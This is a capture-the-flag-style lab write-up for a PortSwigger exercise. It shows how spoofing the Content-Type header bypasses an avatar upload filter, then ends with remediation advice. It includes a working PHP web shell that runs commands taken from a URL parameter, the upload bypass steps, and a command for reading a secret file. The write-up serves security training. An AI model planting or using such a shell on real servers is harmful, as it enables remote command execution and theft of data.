## Metadata

- **Difficulty:** Apprentice
- **Category:** File Upload Vulnerabilities
- **Lab URL:** [Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
- **Date Solved:** 24/4/2026
## Vulnerability Summary

The app contains a vulnerable image upload function. It attempts to validate file uploads by checking if the input-specific `Content-Type` header  matches an expected MIME type. However, the server implicitly trusts this user-controllable value and has no other mechanisms to verify whether the contents of the files uploaded actually match the supposed MIME type. This vulnerability allows us to modify the value of the header and upload any file type we want, in this case a web shell to gain control of the server.  
## Reconnaissance

After navigating to `url/login` and login with credentials `wiener - peter`, we are taken to `url/my-account?id=wiener`, and are presented an option to upload an image as our avatar. Observing the intercepted HTTP POST request reveals the file is transmitted as `multipart/form-data`. The boundary contains the `Content-Type: image/jpeg` header. The server responds with a `200 OK`.

Try uploading a `php` web shell ([PHP shell](../shell.php)) right away would give us a `403 Forbidden` HTTP response that reads `Sorry, file type application/octet-stream is not allowed. Only image/jpeg and image/png are allowed`. This suggests that the app checks the value of the `Content-Type` header to validate file uploads.  Trying to upload the same `php` web shell file again, this time with `Content-Type: image/jpeg` in the request, results in a `200 OK` HTTP Response and the response message `The file avatars/shell.php has been uploaded.` This suggests that the app does not implement any further validation mechanisms other than checking the user-controllable `Content-Type` header input to validate file uploads.
## Exploitation Steps

1. Navigate to `url/login` and login with credentials `wiener - peter`. You'll taken to `url/my-account?id=wiener`, where you'll see an option to upload a file to be your avatar.
2. Intercept the HTTP request to upload the [PHP shell](../shell.php) with Burp Suite Proxy, and send this request to the **Repeater**. You'll be redirected to `url/my-account/avatar`, with the message `Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`. On the intercepted request, change the value of the `Content-Type` header from `application/octet-stream` to `image/jpeg`, then resend the request. You shall see `The file avatars/shell.php has been uploaded.`, signifying that the `php` web shell has been uploaded successfully. Right click on this HTTP response, select the option to "Open response in browser", then paste the link onto the browser. The same message should appear on the website, and under that there should be a link that says "Back to My Account". Click on it to be taken to `url/my-account?id=wiener`.
3. On the `url/my-account?id=wiener`, right click on your "avatar" and select "Open Image in New Tab". You'll be taken to `url/files/avatars/shell.php`, with a shell to execute commands. The `php` script has been executed as code.
4. Execute a simple command `cat /home/carlos/secret` to read the content of the secret file. It will be displayed on the same page after you clicked "Execute". Submit the string as solution, and lab is solved.
## Payload Used

- `Content-Type: image/jpeg`
- `php` web shell: [PHP shell](../shell.php)
- Command to read secret file: `cat /home/carlos/secret`.
Modifying the value of the `Content-Type` header is enough to bypass the app's file upload validation.
In the `php` execution block:
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
- `if(isset($_GET['cmd']))`: Checks if the `cmd` parameter exists in the URL query string, in order to prevent PHP from throwing "Undefined Index" warnings when the page is initially loaded without commands.
- `system(...)`: PHP function that executes a system command and directly outputs the results to the browser.
- `$_GET['cmd']`: retrieves the attacker's (our) input directly from the URL.
- `2>&1`: redirects stderr into stdout, to ensure that error messages are displayed in the browser.
## Root Cause

The app's only file type validation mechanism for file upload is checking the value of the header `Content-Type`. It implicitly trusts this user-controllable value and has no other mechanisms to verify whether the contents of the files uploaded actually match the supposed MIME type, allowing for a simple bypass by modifying this value. These server-side uploaded scripts are also configured to be executed as code, allowing us to execute the `php` code in our file, thus successfully creating our web shell.
## Remediation

- Do not use blocklists (which can be bypassed using alternate extensions like `.php5`, `.phtml`, etc.). Implement a strict whitelist of accepted file extensions (e.g., `.jpg`, `.jpeg`, `.png`). Reject any file that does not strictly match the whitelist.
- Do not trust the `Content-Type` header from the client request, as it is easily spoofable. Verify the file's internal signature (magic bytes) using server-side libraries to ensure the file is genuinely the type it claims to be (e.g., checking that a JPEG starts with `FF D8 FF E0`).
- Configure the web server to prevent the execution of scripts in the directory where user files are stored. Use `.htaccess` or server configuration directives like `php_flag engine off` or `RemoveHandler .php` for `Apache`. For Nginx, ensure the location block for the upload directory does not pass requests to the FastCGI/PHP-FPM backend.
- Never use the user-supplied filename. Generate a new, randomized filename (e.g., using a UUID) upon upload to prevent path traversal attacks (`../`) and file overwriting.
- If possible, store uploaded files in a directory located outside of the web root. Serve them to users via a dedicated script that checks authorization and explicitly sets the `Content-Type` and `X-Content-Type-Options: nosniff` headers during download.